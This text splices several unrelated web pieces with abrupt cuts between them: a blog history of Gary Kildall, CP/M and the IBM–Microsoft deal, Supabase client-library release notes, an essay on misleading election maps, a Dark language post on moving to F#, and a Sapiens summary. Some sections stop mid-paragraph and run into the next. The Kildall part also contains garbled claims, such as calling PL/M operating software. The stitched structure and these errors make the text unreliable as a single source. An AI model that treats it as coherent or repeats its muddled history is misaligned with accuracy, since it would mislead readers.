<p>It was around this time that Gary developed operating software for Intel 4004 microprocessor. He called it PL/M (<em>Programming Language for Microcomputers</em>). </p>



<p>Some time later, he came up with CP/M (<em>Control Programming for Microcomputers</em>) which could help the microprocessor control a floppy drive. </p>



<p>Apparently, CP/M failed to excite the Intel honchos and they decided to give it a pass.</p>



<p>Not happy with the cold response of Intel, Gary along with his wife Dorothy decided to go full hog with CP/M. </p>



<p>The couple started a company called Intergalactic Digital Research out of their old Victorian home in California. Later in 1977, they incorporated it as Digitial Research Inc. (DRI).</p>

<p>Before CP/M came along, every computer had to have a tailor-made software. Gary changed that. By 1979, CP/M was the most popular 8-bit operating system in the world. Microcomputer companies such as IMSAI 8080, North Star, Osborne were all running on CP/M. </p>



<p>At the same time, a little known company called <a href="https://en.wikipedia.org › wiki › Traf-O-Data" target="_blank" rel="noreferrer noopener" aria-label="Traf-O-Data (opens in a new tab)">Traf-O-Data</a> run by a certain Bill Gates and Paul Allen also used CP/M to collect data from the roadway traffic counters. </p>



<p>By the late-70s, the waves of change were sweeping away microcomputers. Gary was going to straddle the change from microcomputers to personal computers. A change even he didn’t see coming.</p>







<p><a href="https://bookjelly.com/valley-of-genius/" target="_blank" rel="noreferrer noopener">Steve Wozniak and co.</a> hit the market with first Apple personal computer in 1976 and soon others followed. </p>



<p>The PC market ballooned to $1 billion size within a matter of three years. </p>



<p>It wasn’t long before IBM – the tech giant of that era – took notice and decided to jump into the fray. </p>



<p>IBM knew it was late to the PC market and had to come out all guns blazing. </p>



<p>In 1981, the IBM crack team tasked with creating the first IBM PC decided to buy off-the-shelf components along with software in order to expedite its entry to the PC market.</p>



<p>Bill Gates and Microsoft were on the rise by the early ’80s. </p>



<p>IBM approached Gates who rightly pointed them to DRI citing that Microsoft had yet to build an operating system of its own. </p>



<p>However, before moving on, IBM legal team had Bill sign a non-disclosure agreement (NDA). </p>



<h2>What went wrong?</h2>



<p>The legend is that Bill Gates called Gary Kildall to inform him about the arrival of an important group of people. </p>



<p>His NDA with IBM forbid him to mention anything about the company and their meeting though. Sadly, Gary failed to decipher the cryptic message of Bill Gates and left for a flying trip in his private plane. </p>



<p>When IBM came knocking, Gary wasn’t home. His wife Dorothy and a team of DRI lawyers met the IBM team and apparently, failed to inspire any confidence in them.</p>



<p>IBM wanted a forever license for CP/M – something Dorothy refused flat-out. </p>



<p>Further, IBM wanted Dorothy to sign a unilateral non-disclosure agreement which she and her legal team weren’t very comfortable with.</p>



<p>By the time, Gary met the IBM team, a fair bit of damage was done. Gary wanted to sell CP/M on a royalty basis, retaining its name. IBM wanted to pay a one-time fee instead.</p>



<p>As a result, IBM team stalked out in a huff and appraoched Bill Gates again, who now sensed a clear opportunity. </p>



<p>The only issue was that Microsoft still didn’t have an operating system.</p>



<p>To solve this problem, Bill Gates scurried to <a rel="noreferrer noopener" aria-label="Seattle Computers (opens in a new tab)" href="https://en.wikipedia.org/wiki/Seattle_Computer_Products" target="_blank">Seattle Computers</a>, a me-too manufacturer of CP/M clone called Q-DOS. </p>



<p>Q-DOS was the shorthand for <em>Quick and Dirty Operating System</em>. Microsoft rechristened it as PC-DOS and presented it to IBM.</p>



<p>This upset Gary. </p>



<p>IBM sensing a legal infringement approached Gary with a solution that it would license both Microsoft’s PC-DOS and DRI’s CP/M with its line of PCs and let the market decide which one is better. </p>



<h2>Confusion reigned supreme</h2>



<p>When IBM rolled out the advertisements for both products, DRI was in for a rude shock. </p>



<p>Bill Gates had priced PC-DOS at $40 whereas Gary’s CP/M-86 sold for $240. A massive 6-to-1 chasm.</p>



<p>Some industry insiders later commented that IBM consciously priced CP/M six times higher than PC-DOS. It never had the intention to honor the agreement with DRI in spirit.</p>



<p>Microsoft now had the game rigged in its favor and it went on to conquer the world. DRI suffered a major blow and started to slip off the industry’s radar and with it did Gary Kildall.</p>



<h2>The end of the road</h2>



<p>Gary’s life wasn’t the same post-IBM-contract. </p>



<p>In 1991, he sold DRI to Novell as a last ditch effort to put up a fight against Microsoft. Sadly, that failed, too. These failures took a heavy tolly on him. </p>



<p>Everywhere he went, people would bring up IBM, Microsoft and if he was really flying out on that day. </p>



<p>As a consequence, he descended into alcholism and severed his professional connections. In 1991, he stopped appearing in ‘<a href="https://www.youtube.com/watch?v=w9EHc80HY4U" target="_blank" rel="noreferrer noopener" aria-label="The Computer Chronicles (opens in a new tab)">The Computer Chronicles</a>‘, a famous tech show on TV which he co-hosted since 1985. </p>



<p>Then came the worst. In 1994, Gary got into a brawl at a Biker’s bar and later passed away due to head injuries. It was a tragic end to a life full of passion. </p>



<p>Jacqui Morby of TA Associates – a PE firm which invested in DRI – recounts an interesting incident <a rel="noreferrer noopener" aria-label="in an interview to Stewart Cheifet (opens in a new tab)" href="https://www.youtube.com/watch?v=bLVbSjDq0DE" target="_blank">in a video interview to Stewart Cheifet</a>, Gary’s co-host at ‘The Computer Chronicles’. </p>



<p>Gary Kildall and Bill Gates were both on a panel during a tech event. Gary made a point that this (operating systems) is a very large market and there is room for lots of companies. </p>

<p>Bill Gates interjected, <strong>“<em>No! There will always be one company.</em>“</strong></p>



<h2>Lost in the footnotes of history?</h2>



<p>It’s an acknowledged fact that history remembers winners. The losers often get relegated to the footnotes of the past and sometimes, they just vanish altogether. </p>



<p>All we can do is imagine what might have been but let’s make sure that Gary Kildall’s story is not forgotten.</p>



<p>Do you think it was Gary Kildall’s operating system that underpinned Bill Gates’s empire? Was Gates right to grab the opportunity that presented itself the second time with both hands? Let me know your thoughts in the comments box below. </p>

While they're still a work in progress, here are some things we think you'll like:</p><ul><li>The <a href="https://supabase.io/docs/client/supabase-client">Reference Docs</a> are auto-generated from our Typescript definitions and then enriched with examples. This forces us to document our code and makes it easier to keep everything in sync.</li><li>We added placeholders for the other languages that the community is developing. They have already started with Python, C#, Dart, Rust, and Swift. Expect to see the docs filling up soon!</li><li>We've added sections for all of the open source tools we use, including <a href="https://supabase.io/docs/postgres/server/about">Postgres</a>, <a href="https://supabase.io/docs/postgrest/server/about">PostgREST</a>, <a href="https://supabase.io/docs/gotrue/server/about">GoTrue</a>, and <a href="https://supabase.io/docs/realtime/server/about">Realtime</a>. We'll be filling these with lots of valuable information including self-hosting, benchmarks, and simple guides.</li></ul><h3>Errors are returned, not thrown</h3><p>We attribute this improvement to community feedback. This has significantly improved the developer experience. Previously we would throw errors:</p><div><div><div><div><p><span>try</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>const</span><span> </span><span>{</span><span> body </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>'*'</span><span>)</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>catch</span><span> </span><span>(</span><span>error</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>error</span><span>)</span><span></span></p><p><span></span><span>}</span></p></div></div></div></div><p>And now we simply return them:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span> data</span><span>,</span><span> error </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>'*'</span><span>)</span><span></span></p><p><span></span><span>if</span><span> </span><span>(</span><span>error</span><span>)</span><span> </span><span>console</span><span>.</span><span>log</span><span>(</span><span>error</span><span>)</span><span></span></p></div></div></div></div><p>After testing this for a while we're very happy with this pattern.

Of course you can always rethrow the error if that's your preference.</p><h3>We created <code>gotrue-js</code></h3><p>Our goal for <code>supabase-js</code> is to tie together many sub-libaries. Each sub-library is a standalone implementation for a single external system. This is one of the ways we support existing open source tools.</p><p>To maintain this philosophy, we created <a href="https://github.com/supabase/gotrue-js" target="_blank" rel="noopener noreferrer"><code>gotrue-js</code></a>, a library for Netlify's GoTrue auth server.

                        <div><p>Graphs can inform, and informed discussions can be more civil than uninformed ones. But graphs can also mislead, so we need to understand what a graph is saying when we're using it. In 2015 I gave gave a TEDx talk on making clearer election maps. The original recording was lost, then recovered and <a href="https://www.youtube.com/watch?v=U5qn33KR7us">uploaded to Youtube</a> this summer. As election season ramps up, I'd like to continue the discussion by talking about this often-misleading map.</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/countywinner_2016.png"><figcaption>2016 County-Level Winner-Takes-All map</figcaption></figure><!--kg-card-end: image--><p>Different graphs are designed for different purposes. The graph above is a county-level winner-takes-all map. I'll call it a County Winner map for short. Scientists use it to quickly see which way the counties went in an election. While there is arguably no better map for seeing who won in which county, this map can be misleading when used for other purposes. We need to be aware of two of its characteristics:</p><ol><li>It doesn’t express the <strong>relative voting populations</strong> between each county. Instead, it can make people feel like each county has the same population.</li><li>It’s not designed to express the <strong>margin of victory</strong> within each county. It shows who won in a county, even if they won by just one vote. It’s a winner-takes-all graph, after all.</li></ol><h3 id="relative-voting-population">Relative Voting Population</h3><p>Half of the US population lives in these counties:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/image-1.jpg"><figcaption>Half lives in blue. Half lives in gray. Census/Business Insider</figcaption></figure><!--kg-card-end: image--><p>America can be described as a collection of densely populated metros buffered by less densely populated communities. Here’s what the “population mountains” look like:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/where_we_live_pop_lg.jpg"><figcaption>This map of U.S. population density appeared in Time magazine Oct. 30, 2006 issue.</figcaption></figure><!--kg-card-end: image--><p>When we take the County Winner map and resize each county’s land-area to be proportionate to its population, here’s how the US looks.</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/image-4.jpg"><figcaption>Mark Newman, University of Michigan</figcaption></figure><!--kg-card-end: image--><p>One downside to the cartogram, however, is that the shape and location of many territories are distorted beyond recognition. This is maybe one reason why the cartogram isn't very mainstream.</p><p>The County Winner map, however, doesn’t convey this relative population information. It's not designed to. But one might think it does. </p><h3 id="margin-of-victory">Margin of Victory</h3><p>In the general election, there are 50 concurrent presidential races, one for each state. In some of these states, the margin of victory turns out to be very small. In New Hampshire, <code>743,117 votes</code> were cast for the president in the 2016 general election. Hillary Clinton won New Hampshire by <code>2,701 votes</code>. We can seat as many people in a set of high school football bleachers.<br></p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/IMG_2944.jpeg"><figcaption>How New Hampshire was won.</figcaption></figure><!--kg-card-end: image--><p>There was a <code>75.03% turnout</code> in New Hampshire, so more people could have voted that didn’t. If just 2,702 more eligible voters in New Hampshire exercised their right to vote and voted for Trump, then New Hampshire would have gone to Trump instead. With such hair thin margins, New Hampshire is neither Blue nor Red in 2016. It’s <code>50:50</code> and leaning red or blue depending on traffic and dinner plans. It would be misleading to have all of New Hampshire colored as either blue or red to represent the statewide popularity of a presidential candidate. </p><p>This characteristic also holds true at the county level. The losing candidate in a county can receive a significant number of votes. In many counties the winner won by less than a 25% margin.</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/2016_margin_histogram_rb.jpg"><figcaption>Kenneth Tay, Stanford University.

Clinton's county-level percent-win margins are on the left. Trump's county-level percent-win margins are on the right. The yellow area highlights counties won with vote margins within 25%. Note that these are percent vote margins, not absolute vote margins</h6><p>In general, smaller counties were won by larger percent margins. Larger counties were won by smaller percent margins. So in the counties with the most votes cast, the runner up got a lot of votes, too. </p><p>Here’s what the County Winner map looks like when we account for vote margins by blending each red and blue vote together within each county. Purple represents 50:50:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/purple-map-2016.png"><figcaption>2016 Purple Map</figcaption></figure><!--kg-card-end: image--><p>The neutralizing map is designed to express vote margins more clearly. It uses a grey intermediary, adjusting for <a href="https://www.fastcompany.com/3035951/the-glaring-design-flaw-in-us-election-maps">the way humans perceive purple</a>.

The County Winner map, however, doesn’t convey this win margin information.</p><p>The contiguous United States aren't very contiguous. The County Winner map's inability to express vote population and margin of victory can be misleading. Cartograms account for population, but they distort the shape of the US, which can add confusion. The neutralizing map accounts for vote margin, but it doesn't account for population.</p><p><strong>Can we construct a single map that shows both vote margin and vote population without distorting the shape of the US?</strong></p><p>Here's one way:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/muddy_america_2016_weru_animated.gif"><figcaption>Animated GIF that goes from the County Winner map to old muddy.</figcaption></figure><!--kg-card-end: image--><p>Here's a less-distracting, static version of the graph:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/muddy_america_2016_static-1.png"></figure><!--kg-card-end: image--><p>The map leverages Color Theory to express <code>vote margins</code> and <code>vote populations</code> in a 2-dimensional scale. </p><p>Here's the key blown up:</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/muddy_key_labeled_compressed.png"></figure><!--kg-card-end: image--><p>Horizontal scale represents vote margins.

However, this would be visually misleading. A logarithmic scale flattens the min:max vote totals proportion from <code>1:39,282</code> closer to<code>1:3.5</code>, visually equating population mountains with population plains.</p><!--kg-card-begin: image--><figure><img src="https://stemlounge.com/content/images/2019/10/logarithmic_scale-16.png"><figcaption>In this log-scale graph of northwest Texas, can you distinguish a county with 1,000 votes from one with 50,000 votes?</figcaption></figure><!--kg-card-end: image--><p>We maintain a linear vote totals scale and use the statistical <code>upper fence</code> to account for outliers. The statistical upper fence can be calculated using the formula <code>Q3 + 1.5 * IQR</code>. Since the county vote margins are only concerned with %DEM|%GOP, county vote totals are DEM+GOP. For vote totals, we calculate the statistical upper fence to be <code>59,828 DEM+GOP votes</code>. We need to keep in mind that <code>432 counties</code> have vote totals ≥ <code>59,828 DEM+GOP</code> and are fully opaque in the Muddy Map. </p><h2 id="practical-uses-of-the-muddy-map">Practical uses of the Muddy Map</h2><p>The formulas give the Muddy Map graph some interesting characteristics. For each county, both the percent vote margin, as well as the vote totals (≤ the statistical upper fence), are embedded in the colors of the graph.</p><p>The Practical Characteristics of the Muddy Map Algorithm:</p><ul><li>There are only two hues, <code>red (hue#0 aka hue#360)</code> and <code>blue (hue#240)</code>. Red indicates GOP win, blue indicates DEM win.</li><li>A county with a <code><em>vote margin</em> of 100%</code> will have <code>100% saturation</code>. </li><li>A county with a <code><em>vote margin</em> of 0%</code> will have <code>0% saturation</code>. Such a county will be a pure gray, since gray appears at 0% saturation. So the closer a county gets to 50:50, the more gray it appears. No county in the 2016 election had a vote margin of 0%.</li><li>A county with <code>0 <em>total votes</em></code> will have <code>100% lightness</code>.

                    <p><em>Welcome HN! Dark is a programming language, structured editor, and infrastructure—all in one—whose goal is to make it 100x easier to build backend services.

Thanks for checking us out!</em></p><hr><p><em>Part of a set with <a href="https://blog.darklang.com/leaving-ocaml/">Leaving OCaml</a> and <a href="https://blog.darklang.com/why-dark-didnt-choose-rust/">Why Dark didn't choose Rust</a>.</em></p><p>Nothing in my life so far would have prepared me for the fact that I would be willfully choosing to move to .NET, but it's 2020, and nothing matters anymore.</p><p>I've been evaluating new languages for the Dark backend over the last 2 months or so. For a <a href="https://blog.darklang.com/leaving-ocaml/">bunch of reasons</a>, OCaml has been a little unsatisfactory.</p><p>Over the last few years we've always said "when we rewrite the backend", "at some point we'll rewrite and this will go away", etc. There's a lot of new code to be written on the backend, to meet our roadmap. Are we really going to write it once, and then rewrite it later? Or would it be faster to just port it now, and write the new code in the new stack?</p><p>Ultimately, I decided that if there was going to be a change, now was the time. And more importantly, if there wasn't going to be a change, now was an excellent time to fully commit to OCaml, and not be second guessing the choice.</p><p>Initially, I expected to go to Rust. <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">Rust has excellent tooling, great libraries, a delightful community, etc</a>. But after spending about a month on it, I can't say I like writing Rust. Especially, I don't like writing async code in Rust. I like a nice high level language, and that's kinda what you need when you have a project as big as Dark to build. And Rust is not that. I'll publish "Why Dark didn't choose Rust" next. Or I might call it "you'll never believe just how much a Garbage Collector does for you!", because that's the summary.</p><p>When I was working on <a href="https://github.com/darklang/fizzboom/">Async benchmarks</a> before, what I was really doing was evaluating "are any of these OCaml alternatives better? And if so are they also faster?". I evaluated and expected not to like F#. I actually quite like it. It's close enough to OCaml, has great library support, and tooling which so far has been a mix of great and terrible. The 90's Microsoft tooling is still there, and that bit isn't all that great, but overall it's a much better situation than OCaml or Rust.</p><h2 id="why-did-i-chose-f-">Why did I chose F#?</h2><p>Let's start with the obvious, F# is OCaml. It's OCaml backed by the world's largest and most experienced creators of programming languages. And in the areas that OCaml is great, F# is also great! Sum types, static typing, eager execution, pipelines, immutable values, all of this is really great.</p><p>It actually has a much better type system, in my opinion. One thing that sticks out is that OCaml made it really cumbersome to use maps. Like, hashtables, associative arrays, whatever you call them. It seems the old version of Real World OCaml has been taken down, so I can't show you how unpleasant they were at the start. Now, in the latest version, they are <a href="https://dev.realworldocaml.org/maps-and-hashtables.html">more moderately unpleasant</a> to use. Whereas in F#, you have a <code>Map&lt;OneType,AnotherType&gt;</code> and that's really it. Magic!</p><p>Of course, the main reason I chose .NET was the libraries. It has libraries for everything, what a surprise. While there aren't all that many F# first-party libraries, every vendor out there has a .NET SDK that you can use directly from F#. I look forward to finally having first-party support for <a href="https://honeycomb.io/">Honeycomb</a>, <a href="https://rollbar.io/">Rollbar</a>, and Google Cloud. I'm even finally going to get to use <a href="https://launchdarkly.com/">LaunchDarkly</a>, after <a href="https://www.heavybit.com/library/podcasts/to-be-continuous/">years of telling Edith</a> I would.</p><p>The other thing I've really enjoyed is how good the docs and community content are. A lot of OCaml community content is on the language and what you can do with it. F# developers seem to just want to get shit done. There's a million blog posts, youtube videos, etc, from enterprise software developers talking about the best way to build web software. And then of course the massively detailed and useful <a href="https://fsharpforfunandprofit.com/">FSharpForFunAndProfit</a>, as well as <a href="http://tomasp.net/">Tomas Petricek</a>'s work - it's really great.</p><p>I think most of this is due to the size of the community. I've heard people say that there are very few F# developers; something like there's 1M C# users, 100k VB users, and 10K F# users, or something like that. I'm not sure exactly what counts as user, but I would imagine that OCaml has fewer than 100 "users" in this metric, so it feels like I'm moving to a massive community.</p><p>Not everything is amazing though. The build system is attrocious. While <code>paket</code> is roughly on par with <code>esy</code>, msbuild is 1000 times worse than <code>dune</code>. An incremental build in dune is like 1s for me, and 6s in .NET, even if nothing is happening. I know they have fancy incremental compilers for .NET so this puzzles me; if anyone has tips on getting really fast compilation in F#, <a href="mailto:paul@darklang.com">I would appreciate them</a>.</p><p>An important thing to check was whether I could compile my code to JS. Dark's execution engine runs it the editor as well, and that's one of the core things that makes Dark special. Because of this, I want to take unaltered backend code and compile it directly to JS. This isn't like <a href="https://rescript-lang.org/">Rescript</a> (which is OCaml compiled to JS with slightly different semantics and ecosystem, or it's equivalent in F#, <a href="https://fable.io/">Fable</a>). Fortunately, F# code can be compiled to Wasm using <a href="https://dotnet.microsoft.com/apps/aspnet/web-apps/blazor">Blazor</a>. Blazor compiles the .NET runtime to WASM and runs your code in that. It <a href="https://github.com/darklang/dark/tree/main/fsharp-backend/src/Wasm">barely took any code</a> to get working either (though figuring out the right incantation was not trivial).</p><h2 id="feedback-from-leaving-ocaml-blog-post">Feedback from "Leaving OCaml" blog post</h2><p><a href="https://blog.darklang.com/leaving-ocaml/">Yesterday's post</a> got a lot of people to add their opinions. In addition to some <a href="https://news.ycombinator.com/item?id=24976630">Scala</a> and <a href="https://twitter.com/fakenickels/status/1323304778089304070">Erlang</a> love, a lot of people pointed to F#:</p><blockquote>So...I think a decent choice to make here is to switch from OCaml to F#. You'll get almost all of the benefits and most of the drawbacks go away. And for the most part, you can directly translate the code from OCaml to F#. - <a href="https://news.ycombinator.com/item?id=24978526">darksaints</a></blockquote><blockquote>I've been using F# on GCP in production for 3 years now and it's fantastic and only getting better. You can leverage existing .NET libraries (for example, you get official GCP libraries from google) and if you use them enough it's easy enough to write a functional wrapper around them. - <a href="https://news.ycombinator.com/item?id=24978526">angio</a></blockquote><blockquote>We have considered OCaml but went for F# instead. I could not be happier. Great libraries, good tooling, in 2020 F# is a first class citizen in the cloud thanks to C# and .NET Core. You can develop on Linux, Windows, MacOS and without modification it works. Compilation times are great. Unless you want to deal with the low level nature and the C++ influence in Rust F# is a much more logical step to move from OCaml. There is dotnet fsi for REPL too. F# has access to C# libraries and it is relatively easy to write a thin wrapper that convert nulls to Nones, so you are null safe or C# style functions to ML style functions so you can use |&gt; or &lt;| etc. - <a href="https://lobste.rs/s/bcwbuw/leaving_ocaml#c_uoy61u">l1x</a></blockquote><h2 id="next-steps">Next steps</h2><p>I recently merged the <a href="https://github.com/darklang/dark/tree/main/fsharp-backend">first F# code into the codebase</a>. It's an async version of the core of the Dark interpreter, connected to Giraffe (F#'s low-level interface to .NET's Kestrel web server).</p><p>My plan is to reimplement the same language, but with some of the learnings that are in the <a href="https://roadmap.darklang.com/">roadmap</a>. For example:</p><ul><li><code>Result</code> and <code>Options</code> will be types, not special cased into the language</li><li><code>Int</code> will be infinite precision (this is technically a breaking change, but not a significant one AFAICT)</li><li>breaking out the API server, using F# builtin middleware libraries</li><li>refactoring the Dark public HTTP server into composable middleware, available from within Dark</li></ul><p>I'll be working on making the equivalent to the existing Dark interpreter, keeping the semantics the same. After that, I'll be making new features from the <a href="https://roadmap.darklang.com/">Dark Roadmap</a>.</p><h2 id="implementation-plan">Implementation plan</h2><p>Dark's backend is 37K lines of OCaml, of which 8K lines are tests, and 10K lines are the Dark standard library. So there's about 20K lines to port. Should be fun. My implementation plan is to get to parity - there's plenty of time after that to take advantage of the ecosytem:</p><ul><li>finish the interpreter</li><li>connect Dark's F# backend to Dark's DB, so it can read the same data</li><li><s>compile Dark's F# interpreter to JS</s> (done, see above)</li><li>make an OCaml library to deserialize the binary opcodes in the DB and covert them into F# (via, I presume, a JSON intermediary). This will allow incoming requests to (optionally) be routed to the F# service.</li><li>add a fuzzer to ensure the semantics of the OCaml and F# versions of Dark are the same (especially the library functions)</li><li>do all the devops (getting it into k8s, etc)</li><li>add the APIs we have available in OCaml</li><li>add a way for users to safely try their code in the new version</li><li>port over 170 or so functions we have in the standard library</li><li>start recording traces using <a href="https://blog.darklang.com/evolving-darks-tracing-system/">the new design</a> (this is actually the main thing driving the whole change, believe it or not!)</li><li>use <a href="https://www.honeycomb.io/">Honeycomb</a>, R<a href="http://rollbar.com/">ollbar</a>, and Google Cloud using their .NET native interfaces</li><li>port our <a href="https://github.com/darklang/dark/tree/main/services">various services</a> to F# (lower priority)</li><li>port our accounts to self-managed from Auth0</li><li>translate the <a href="https://docs.darklang.com/contributing/ocaml-for-dark-developers">contributor docs</a> to F#</li></ul><p>There's lots to do, and <a href="https://docs.darklang.com/contributing/getting-started">Dark contributors</a> are welcome to take part.

<p>I spent over 25 hours building a cut-down version of Sapiens. The goal? Future-me should be happy to read this once future-me forgets how we evolved. It’s massive for a blog post, just under 30 minutes, but that’s the best I could do, condensing 9 hours worth of material.</p>

<p>I’ve tried to keep editing to a minimum: It’s the original text, edited to ensure it still flows like the book.</p>

<p>You can get the book <a href="https://amzn.to/2WWNsjq" target="_blank" rel="noopener">here</a><sup id="fnref:2"><a href="#fn:2">1</a></sup></p>

<h2 id="development-of-brains">Development of brains</h2>

<p>What caused our brains to develop? We’re not sure.</p>

<p>It doesn’t seem likely. A larger brain needs more energy and thus reduces the chance you’ll survive. Getting more energy meant hunting more.</p>

<p>One contributing factor was the domestication of fire. Fire paved the way for cooking.</p>

<p>Whereas chimpanzees spend 5 hours a day chewing raw food, a single hour suffices for people eating cooked food. The advent of cooking enabled humans to eat more kinds of food, to devote less time to eating, and to make do with smaller teeth and shorter intestines. Some scholars believe there is a direct link between the advent of cooking, the shortening of the human intestinal track, and the growth of the human brain. Since long intestines and large brains are both massive energy consumers, it’s hard to have both. By shortening the intestines and decreasing their energy consumption, cooking inadvertently opened the way to the jumbo brains.</p>

<p>And, we weren’t alone. Competing with us were the Neanderthals, among other species. They were stronger, they had bigger brains, and they could survive the cold. How come, then, did we “win”?</p>

<p>We aren’t sure. The most likely answer is the very thing that makes the debate possible: Homo sapiens conquered the world thanks above all to its unique language.</p>

<h2 id="cognitive-revolution">Cognitive Revolution</h2>

<p>The appearance of new ways of thinking and communicating, between 70,000 and 30,000 years ago, constitutes the Cognitive Revolution. What caused it? We’re not sure. The most commonly believed theory argues that accidental genetic mutations changed the inner wiring of the brains of Sapiens, enabling them to think in unprecedented ways and to communicate using a new type of language. We might call it the Tree of Knowledge mutation.</p>

<!-- 
> All new humans are improvements over the past?
> As in, the de facto keeps rising.

>These mutated humans were praised for their initiative and were more successful
>Till everyone became like this and then even more better humans were praised and the previous became the normal -->

<p>What’s special about our language?</p>

<p>Our language is amazingly supple. We can connect a limited number of sounds and signs to produce an infinite number of sentences, each with a distinct meaning. We can thereby ingest, store and communicate a prodigious amount of information about the surrounding world. A monkey can yell to its comrades, ‘Careful! A lion!’ But a modern human can tell her friends that this morning, near the bend in the river, she saw a lion tracking a herd of bison. She can then describe the exact location, including the different paths leading to the area. With this information, the members of her band can put their heads together and discuss whether they ought to approach the river in order to chase away the lion and hunt the bison.</p>

<!-- Most likely, both the gossip theory (who can be trusted and who can't) and the there-is-a-lion-near-the-river theory are valid.  -->

<p>Yet the truly unique feature of our language is not its ability to transmit information about men and lions. Rather, it’s the ability to transmit information about things that do not exist at all. As far as we know, only Sapiens can talk about entire kinds of entities that they have never seen, touched or smelled.</p>

<!-- The alpha male usually wins his position not because he is physically stronger, but because he leads a large and stable coalition -->

<p>Using language, lots of humans could work together, form a tribe, help each other, and hunt together.</p>

<p>However, communicating with lots of people brings with it new co-ordination problems. The critical threshold for a group interacting together is 150 people.</p>

<!-- But once the threshold of 150 individuals is crossed, things can no longer work that way. You cannot run a division with thousands of soldiers the same way you run a platoon. Successful family businesses usually face a crisis when they grow larger and hire more personnel. If they cannot reinvent themselves, they go bust.  -->

<p>How did Homo sapiens manage to cross this critical threshold, eventually founding cities comprising tens of thousands of inhabitants and empires ruling hundreds of millions? The secret was probably the appearance of fiction. Large numbers of strangers can cooperate successfully by believing in common myths. This is an imagined reality.</p>

<!-- Ever since the Cognitive Revolution, Sapiens has thus been living in a dual reality. On the one hand, the objective reality of rivers, trees and lions; and on the other hand, the imagined reality of gods, nations and corporations.  -->

<!-- As time went by, the imagined reality became ever more powerful, so that today the very survival of rivers, trees and lions depends on the grace of imagined entities such as gods, nations and corporations. -->

<p>Unlike lying, an imagined reality is something that everyone believes in, and as long as this communal belief persists, the imagined reality exerts force in the world.</p>

<p>In other words, while the behaviour patterns of archaic humans remained fixed for tens of thousands of years, Sapiens could transform their social structures, the nature of their interpersonal relations, their economic activities and a host of other behaviours within a decade or two.</p>

<!-- > Because of the cognitive Revolution and the introduction of imagined reality -->

<p>For example, consider trade. Trade cannot exist without trust, and it is very difficult to trust strangers. The global trade network of today is based on our trust in such fictional entities as the dollar, the Federal Reserve Bank, and the totemic trademarks of corporations. When two strangers in a tribal society want to trade, they will often establish trust by appealing to a common god, mythical ancestor or totem animal.</p>

<!-- One on one, even ten on ten, we are embarrassingly similar to chimpanzees. Significant differences begin to appear only when we cross the threshold of 150 individuals, and when we reach 1,000–2,000 individuals, the differences are astounding -->

<!-- The real difference between us and chimpanzees is the mythical glue that binds together large numbers of individuals, families and groups. This glue has made us the masters of creation. -->

<p>Our Tree of Knowledge mutation was significant. However, it’s not just our biology that brought us where we are today.</p>

<ol>
  <li>
    <p>Biology sets the basic parameters for the behaviour and capacities of Homo sapiens. The whole of history takes place within the bounds of this biological arena.</p>
  </li>
  <li>
    <p>This arena is extraordinarily large, allowing Sapiens to play an astounding variety of games. Thanks to their ability to invent fiction, Sapiens create more and more complex games, which each generation develops and elaborates even further</p>
  </li>
  <li>
    <p>Consequently, in order to understand how Sapiens behave, we must describe the historical evolution of their actions.</p>
  </li>
</ol>

<!-- Referring only to our biological constraints would be like a radio sports-caster who, attending the World Cup football championships, offers his listeners a detailed description of the playing field rather than an account of what the players are doing. -->

<!-- There is some evidence that the size of the average Sapiens brain has actually decreased since the age of foraging. Survival in that era required superb mental abilities from everyone. When agriculture and industry came along people could increasingly rely on the skills of others for survival, and new ‘niches for imbeciles’ were opened up. You could survive and pass your unremarkable genes to the next generation by working as a water carrier or an assembly-line worker. -->

<p>The currency of evolution is neither hunger nor pain, but rather copies of DNA helixes. Just as the economic success of a company is measured only by the number of dollars in its bank account, not by the happiness of its employees, so the evolutionary success of a species is measured by the number of copies of its DNA. If no more DNA copies remain, the species is extinct, just as a company without money is bankrupt. If a species boasts many DNA copies, it is a success, and the species flourishes. From such a perspective, 1,000 copies are always better than a hundred copies. This is the essence of the Agricultural Revolution: the ability to keep more people alive under worse conditions.</p>

<p>Rather than heralding a new era of easy living, the Agricultural Revolution left farmers with lives generally more difficult and less satisfying than those of foragers. Hunter-gatherers spent their time in more stimulating and varied ways, and were less in danger of starvation and disease. The Agricultural Revolution certainly enlarged the sum total of food at the disposal of humankind, but the extra food did not translate into a better diet or more leisure. Rather, it translated into population explosions and pampered elites. The average farmer worked harder than the average forager, and got a worse diet in return. The Agricultural Revolution was history’s biggest fraud.</p>

<!-- > The average person in Jericho of 8500 BC lived a harder life than the average person in Jericho of 9500 BC or 13,000 BC. But nobody realised what was happening. Every generation continued to live like the previous generation, making only small improvements here and there in the way things were done. Paradoxically, a series of ‘improvements’, each of which was meant to make life easier, added up to a millstone around the necks of these farmers -->
<!-- 
--- Way of life being lost over generations
    Like with the foundation.
    Also short sightedness.
    As, working harder here meant more food => can better feed children => even more people exist => You're back where you started, except you're working harder.
 -->

<p>Compared to foraging, working a bit harder on the farm meant more food. Settling down on the farm also meant greater freedom to reproduce - you’re not travelling all the time, so you can afford to have more children. This in turn, meant a higher population. And a higher population meant higher food requirements. Thus, the farmers were forced to work even harder.</p>

